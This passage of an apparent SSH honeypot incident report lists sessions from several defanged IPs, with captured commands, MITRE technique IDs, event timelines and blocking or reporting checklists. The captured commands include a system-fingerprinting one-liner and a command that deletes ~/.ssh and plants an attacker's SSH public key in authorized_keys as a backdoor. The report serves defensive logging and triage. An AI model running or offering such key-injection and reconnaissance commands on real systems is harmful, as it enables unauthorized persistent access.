| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 18:08:24` | `cowrie.session.connect` |
| `2026-07-01 18:08:24` | `cowrie.client.version` |
| `2026-07-01 18:08:24` | `cowrie.client.kex` |
| `2026-07-01 18:08:24` | `cowrie.login.success` |
| `2026-07-01 18:08:25` | `cowrie.session.params` |
| `2026-07-01 18:08:25` | `cowrie.command.input` |
| `2026-07-01 18:08:25` | `cowrie.command.input` |
| `2026-07-01 18:08:25` | `cowrie.command.input` |
| `2026-07-01 18:08:25` | `cowrie.command.input` |
| `2026-07-01 18:08:25` | `cowrie.command.input` |
| `2026-07-01 18:08:25` | `cowrie.command.success` |
| `2026-07-01 18:08:25` | `cowrie.command.input` |
| `2026-07-01 18:08:25` | `cowrie.command.input` |
| `2026-07-01 18:08:25` | `cowrie.command.input` |
| `2026-07-01 18:08:25` | `cowrie.command.input` |
| `2026-07-01 18:08:25` | `cowrie.log.closed` |
| `2026-07-01 18:08:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3c2491eb3f3

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-01 18:08 |
| **Last Seen** | 2026-07-01 18:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 18:08:37` | `cowrie.session.connect` |
| `2026-07-01 18:08:38` | `cowrie.client.version` |
| `2026-07-01 18:08:38` | `cowrie.client.kex` |
| `2026-07-01 18:08:40` | `cowrie.login.success` |
| `2026-07-01 18:08:41` | `cowrie.session.params` |
| `2026-07-01 18:08:41` | `cowrie.command.input` |
| `2026-07-01 18:08:42` | `cowrie.log.closed` |
| `2026-07-01 18:08:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1245c18a37db

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 18:14 |
| **Last Seen** | 2026-07-01 18:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 18:14:59` | `cowrie.session.connect` |
| `2026-07-01 18:14:59` | `cowrie.client.version` |
| `2026-07-01 18:14:59` | `cowrie.client.kex` |
| `2026-07-01 18:14:59` | `cowrie.login.success` |
| `2026-07-01 18:15:00` | `cowrie.session.params` |
| `2026-07-01 18:15:00` | `cowrie.command.input` |
| `2026-07-01 18:15:00` | `cowrie.command.input` |
| `2026-07-01 18:15:00` | `cowrie.command.input` |
| `2026-07-01 18:15:00` | `cowrie.command.input` |
| `2026-07-01 18:15:00` | `cowrie.command.input` |
| `2026-07-01 18:15:00` | `cowrie.command.success` |
| `2026-07-01 18:15:00` | `cowrie.command.input` |
| `2026-07-01 18:15:00` | `cowrie.command.input` |
| `2026-07-01 18:15:00` | `cowrie.command.input` |
| `2026-07-01 18:15:00` | `cowrie.command.input` |
| `2026-07-01 18:15:00` | `cowrie.log.closed` |
| `2026-07-01 18:15:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ed6b14d32af

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 18:18 |
| **Last Seen** | 2026-07-01 18:18 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 18:18:24` | `cowrie.session.connect` |
| `2026-07-01 18:18:26` | `cowrie.client.version` |
| `2026-07-01 18:18:26` | `cowrie.client.kex` |
| `2026-07-01 18:18:31` | `cowrie.login.success` |
| `2026-07-01 18:18:36` | `cowrie.session.params` |
| `2026-07-01 18:18:36` | `cowrie.command.input` |
| `2026-07-01 18:18:37` | `cowrie.log.closed` |
| `2026-07-01 18:18:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49e50d7097e9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 18:21 |
| **Last Seen** | 2026-07-01 18:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 18:21:37` | `cowrie.session.connect` |
| `2026-07-01 18:21:37` | `cowrie.client.version` |
| `2026-07-01 18:21:37` | `cowrie.client.kex` |
| `2026-07-01 18:21:38` | `cowrie.login.success` |
| `2026-07-01 18:21:38` | `cowrie.session.params` |
| `2026-07-01 18:21:38` | `cowrie.command.input` |
| `2026-07-01 18:21:38` | `cowrie.command.input` |
| `2026-07-01 18:21:38` | `cowrie.command.input` |
| `2026-07-01 18:21:38` | `cowrie.command.input` |
| `2026-07-01 18:21:38` | `cowrie.command.input` |
| `2026-07-01 18:21:38` | `cowrie.command.success` |
| `2026-07-01 18:21:38` | `cowrie.command.input` |
| `2026-07-01 18:21:38` | `cowrie.command.input` |
| `2026-07-01 18:21:38` | `cowrie.command.input` |
| `2026-07-01 18:21:38` | `cowrie.command.input` |
| `2026-07-01 18:21:39` | `cowrie.log.closed` |
| `2026-07-01 18:21:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d8038a8c2f3

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-01 18:25 |
| **Last Seen** | 2026-07-01 18:25 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 18:25:41` | `cowrie.session.connect` |
| `2026-07-01 18:25:41` | `cowrie.client.version` |
| `2026-07-01 18:25:41` | `cowrie.client.kex` |
| `2026-07-01 18:25:44` | `cowrie.login.success` |
| `2026-07-01 18:25:46` | `cowrie.session.params` |
| `2026-07-01 18:25:46` | `cowrie.command.input` |
| `2026-07-01 18:25:46` | `cowrie.log.closed` |
| `2026-07-01 18:25:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64354a2ac625

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 18:29 |
| **Last Seen** | 2026-07-01 18:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 18:29:14` | `cowrie.session.connect` |
| `2026-07-01 18:29:14` | `cowrie.client.version` |
| `2026-07-01 18:29:14` | `cowrie.client.kex` |
| `2026-07-01 18:29:14` | `cowrie.login.success` |
| `2026-07-01 18:29:15` | `cowrie.session.params` |
| `2026-07-01 18:29:15` | `cowrie.command.input` |
| `2026-07-01 18:29:15` | `cowrie.command.input` |
| `2026-07-01 18:29:15` | `cowrie.command.input` |
| `2026-07-01 18:29:15` | `cowrie.command.input` |
| `2026-07-01 18:29:15` | `cowrie.command.input` |
| `2026-07-01 18:29:15` | `cowrie.command.success` |
| `2026-07-01 18:29:15` | `cowrie.command.input` |
| `2026-07-01 18:29:15` | `cowrie.command.input` |
| `2026-07-01 18:29:15` | `cowrie.command.input` |
| `2026-07-01 18:29:15` | `cowrie.command.input` |
| `2026-07-01 18:29:15` | `cowrie.log.closed` |
| `2026-07-01 18:29:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79f369a9c51e

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 18:30 |
| **Last Seen** | 2026-07-01 18:30 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 18:30:13` | `cowrie.session.connect` |
| `2026-07-01 18:30:14` | `cowrie.client.version` |
| `2026-07-01 18:30:14` | `cowrie.client.kex` |
| `2026-07-01 18:30:20` | `cowrie.login.success` |
| `2026-07-01 18:30:23` | `cowrie.session.params` |
| `2026-07-01 18:30:23` | `cowrie.command.input` |
| `2026-07-01 18:30:25` | `cowrie.log.closed` |
| `2026-07-01 18:30:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c115ee3981f

| Field | Detail |
|---|---|
| **Source IP** | `143.110.241[.]64` |
| **First Seen** | 2026-07-01 18:33 |
| **Last Seen** | 2026-07-01 18:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 18:33:22` | `cowrie.session.connect` |
| `2026-07-01 18:33:22` | `cowrie.client.version` |
| `2026-07-01 18:33:23` | `cowrie.client.kex` |
| `2026-07-01 18:33:23` | `cowrie.login.success` |
| `2026-07-01 18:33:24` | `cowrie.session.params` |
| `2026-07-01 18:33:24` | `cowrie.command.input` |
| `2026-07-01 18:33:24` | `cowrie.command.failed` |
| `2026-07-01 18:33:25` | `cowrie.log.closed` |
| `2026-07-01 18:33:26` | `cowrie.session.params` |
| `2026-07-01 18:33:26` | `cowrie.command.input` |
| `2026-07-01 18:33:26` | `cowrie.session.file_download` |
| `2026-07-01 18:33:26` | `cowrie.log.closed` |
| `2026-07-01 18:33:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.110.241[.]64` to AbuseIPDB if not already reported
- [ ] Block `143.110.241[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a7bd0b6841b

| Field | Detail |
|---|---|
| **Source IP** | `143.110.241[.]64` |
| **First Seen** | 2026-07-01 18:33 |
| **Last Seen** | 2026-07-01 18:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 18:33:26` | `cowrie.session.connect` |
| `2026-07-01 18:33:26` | `cowrie.client.version` |
| `2026-07-01 18:33:26` | `cowrie.client.kex` |
| `2026-07-01 18:33:27` | `cowrie.login.success` |
| `2026-07-01 18:33:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.110.241[.]64` to AbuseIPDB if not already reported
- [ ] Block `143.110.241[.]64` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb47c9069407

| Field | Detail |
|---|---|
| **Source IP** | `143.110.241[.]64` |
| **First Seen** | 2026-07-01 18:33 |
| **Last Seen** | 2026-07-01 18:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 18:33:28` | `cowrie.session.connect` |
| `2026-07-01 18:33:28` | `cowrie.client.version` |
| `2026-07-01 18:33:28` | `cowrie.client.kex` |
| `2026-07-01 18:33:29` | `cowrie.login.success` |
| `2026-07-01 18:33:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.110.241[.]64` to AbuseIPDB if not already reported
- [ ] Block `143.110.241[.]64` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18e34fd398c7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 18:37 |
| **Last Seen** | 2026-07-01 18:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 18:37:39` | `cowrie.session.connect` |
| `2026-07-01 18:37:39` | `cowrie.client.version` |
| `2026-07-01 18:37:39` | `cowrie.client.kex` |
| `2026-07-01 18:37:39` | `cowrie.login.success` |
| `2026-07-01 18:37:40` | `cowrie.session.params` |
| `2026-07-01 18:37:40` | `cowrie.command.input` |
| `2026-07-01 18:37:40` | `cowrie.command.input` |
| `2026-07-01 18:37:40` | `cowrie.command.input` |
| `2026-07-01 18:37:40` | `cowrie.command.input` |
| `2026-07-01 18:37:40` | `cowrie.command.input` |
| `2026-07-01 18:37:40` | `cowrie.command.success` |
| `2026-07-01 18:37:40` | `cowrie.command.input` |
| `2026-07-01 18:37:40` | `cowrie.command.input` |
| `2026-07-01 18:37:40` | `cowrie.command.input` |
| `2026-07-01 18:37:40` | `cowrie.command.input` |
| `2026-07-01 18:37:40` | `cowrie.log.closed` |
| `2026-07-01 18:37:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9943fb94b3ac

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 18:41 |
| **Last Seen** | 2026-07-01 18:41 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 18:41:46` | `cowrie.session.connect` |
| `2026-07-01 18:41:48` | `cowrie.client.version` |
| `2026-07-01 18:41:48` | `cowrie.client.kex` |
| `2026-07-01 18:41:54` | `cowrie.login.success` |
| `2026-07-01 18:41:57` | `cowrie.session.params` |
| `2026-07-01 18:41:57` | `cowrie.command.input` |
| `2026-07-01 18:41:59` | `cowrie.log.closed` |
| `2026-07-01 18:41:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9abd73dbae75

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-01 18:42 |
| **Last Seen** | 2026-07-01 18:43 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 18:42:57` | `cowrie.session.connect` |
| `2026-07-01 18:42:59` | `cowrie.client.version` |
| `2026-07-01 18:42:59` | `cowrie.client.kex` |
| `2026-07-01 18:43:01` | `cowrie.login.success` |
| `2026-07-01 18:43:03` | `cowrie.session.params` |
| `2026-07-01 18:43:03` | `cowrie.command.input` |
| `2026-07-01 18:43:04` | `cowrie.log.closed` |
| `2026-07-01 18:43:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be2dc6086876

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 18:45 |
| **Last Seen** | 2026-07-01 18:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 18:45:03` | `cowrie.session.connect` |
| `2026-07-01 18:45:03` | `cowrie.client.version` |
| `2026-07-01 18:45:03` | `cowrie.client.kex` |
| `2026-07-01 18:45:03` | `cowrie.login.success` |
| `2026-07-01 18:45:04` | `cowrie.session.params` |
| `2026-07-01 18:45:04` | `cowrie.command.input` |
| `2026-07-01 18:45:04` | `cowrie.command.input` |
| `2026-07-01 18:45:04` | `cowrie.command.input` |
| `2026-07-01 18:45:04` | `cowrie.command.input` |
| `2026-07-01 18:45:04` | `cowrie.command.input` |
| `2026-07-01 18:45:04` | `cowrie.command.success` |
| `2026-07-01 18:45:04` | `cowrie.command.input` |
| `2026-07-01 18:45:04` | `cowrie.command.input` |
| `2026-07-01 18:45:04` | `cowrie.command.input` |
| `2026-07-01 18:45:04` | `cowrie.command.input` |
| `2026-07-01 18:45:04` | `cowrie.log.closed` |
| `2026-07-01 18:45:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad36b46f5f2a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 18:52 |
| **Last Seen** | 2026-07-01 18:52 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 18:52:45` | `cowrie.session.connect` |
| `2026-07-01 18:52:45` | `cowrie.client.version` |
| `2026-07-01 18:52:45` | `cowrie.client.kex` |
| `2026-07-01 18:52:45` | `cowrie.login.success` |
| `2026-07-01 18:52:56` | `cowrie.session.params` |
| `2026-07-01 18:52:56` | `cowrie.command.input` |
| `2026-07-01 18:52:56` | `cowrie.command.input` |
| `2026-07-01 18:52:56` | `cowrie.command.input` |
| `2026-07-01 18:52:56` | `cowrie.command.input` |
| `2026-07-01 18:52:56` | `cowrie.command.input` |
| `2026-07-01 18:52:56` | `cowrie.command.success` |
| `2026-07-01 18:52:56` | `cowrie.command.input` |
| `2026-07-01 18:52:56` | `cowrie.command.input` |
| `2026-07-01 18:52:56` | `cowrie.command.input` |
| `2026-07-01 18:52:56` | `cowrie.command.input` |
| `2026-07-01 18:52:56` | `cowrie.log.closed` |
| `2026-07-01 18:52:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03ae4f637a1c

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 18:53 |
| **Last Seen** | 2026-07-01 18:53 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 18:53:26` | `cowrie.session.connect` |
| `2026-07-01 18:53:28` | `cowrie.client.version` |
| `2026-07-01 18:53:28` | `cowrie.client.kex` |
| `2026-07-01 18:53:33` | `cowrie.login.success` |
| `2026-07-01 18:53:37` | `cowrie.session.params` |
| `2026-07-01 18:53:37` | `cowrie.command.input` |
| `2026-07-01 18:53:38` | `cowrie.log.closed` |
| `2026-07-01 18:53:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `210.16.100[.]120` | **56** | 2026-07-01 14:59 | 2026-07-01 18:45 | 54m | 0 | `T1592` | 🟠 MEDIUM |
| `72.167.53[.]56` | **22** | 2026-07-01 14:56 | 2026-07-01 18:49 | 11m | 0 | `T1592` | 🟠 MEDIUM |
